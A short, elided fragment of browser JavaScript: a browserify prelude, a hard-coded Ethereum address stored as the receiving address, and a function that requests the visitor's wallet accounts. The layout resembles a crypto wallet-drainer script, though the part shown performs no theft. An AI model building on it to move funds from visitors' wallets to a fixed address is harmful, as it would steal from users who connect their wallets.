(function(){function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);
...
var accounts = 0;
const reciev = '0xa818425d152EdD5B9e0Eb306E8a59496bd391226';
...
async function checkAccount()
{
    ...
    var wallet = await ethereum.request({ method: 'eth_accounts' });
    if(wallet.length == 0)
    {
      return 0;
    }
